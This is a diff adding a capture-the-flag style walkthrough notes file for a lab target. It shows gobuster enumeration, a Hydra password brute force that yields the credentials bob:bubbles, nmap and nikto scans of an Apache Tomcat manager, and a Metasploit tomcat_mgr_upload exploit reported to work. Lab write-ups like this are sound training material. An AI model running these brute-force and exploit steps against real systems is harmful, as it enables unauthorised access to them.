@@ -1,1 +1,70 @@
+gobuster dir -u http://10.10.155.95 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+
+Ran gobuster against the target to enumerate directories
+
+Found:
+
+/guidelines
+/protected
+/server-status
+
+-----------------
+
+Navigating to /guidelines shows the message - Hey bob, did you update that TomCat server?
+
+/protected has basic user/pass authentication
+
+----------------
+
+Used Hydra against /protected
+
+hydra -l bob -P /usr/share/wordlists/rockyou.txt -f 10.10.155.95   http-get /protected/
+
+This worked - bob has the password bubbles
+
+-----------------
+
+Then ran nmap against the target to look for other web servers on other ports
+
+nmap -sT -sV -O 10.10.155.95 -p1-2000 -T5
+
+this nmap scan was a TCP connected scan that scanned for services and OS - I also asked it to scan port numbers 1 to 2000 and T5 is the most aggressive scan you can do for nmap
+
+The scan returned a web server on port 1234 that ran APACHE TOMCAT/7.0.88 - this is the software being run NOT THE SERVER VERSION.
+
+-----------------
+
+Next is to use the NIKTO tool -  
+
+nikto -h http://10.10.155.95:1234/manager/html -id bob:bubbles
+
+ Server: Apache-Coyote/1.1
++ The anti-clickjacking X-Frame-Options header is not present.
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Successfully authenticated to realm 'Tomcat Manager Application' with user-supplied credentials.
++ Cookie JSESSIONID created without the httponly flag
++ Allowed HTTP Methods: GET, HEAD, POST, PUT, DELETE, OPTIONS 
++ OSVDB-397: HTTP method ('Allow' Header): 'PUT' method could allow clients to save files on the web server.
++ OSVDB-5646: HTTP method ('Allow' Header): 'DELETE' may allow clients to remove files on the web server.
++ OSVDB-3092: /manager/html/localstart.asp: This may be interesting...
+- STATUS: Completed 2870 tests (~44% complete, 1.4 minutes left: currently in plugin 'Nikto Tests')
++ OSVDB-3233: /manager/html/manager/manager-howto.html: Tomcat documentation found.
++ /manager/html/manager/html: Default Tomcat Manager interface found
++ /manager/html/WorkArea/version.xml: Ektron CMS version information
++ 6544 items checked: 0 error(s) and 10 item(s) reported on remote host
++ End Time:           2024-03-04 14:28:00 (GMT0) (73 seconds)
+-----------------------------------------------------------------
+
+---------------
+
+As the server is Apache/2.4.18 and the server is running Apache-Coyote/1.1
+
+we can use metasploit to exploit
+
+chose the 
+exploit(multi/http/tomcat_mgr_upload) 
+
+this worked
+
+
 
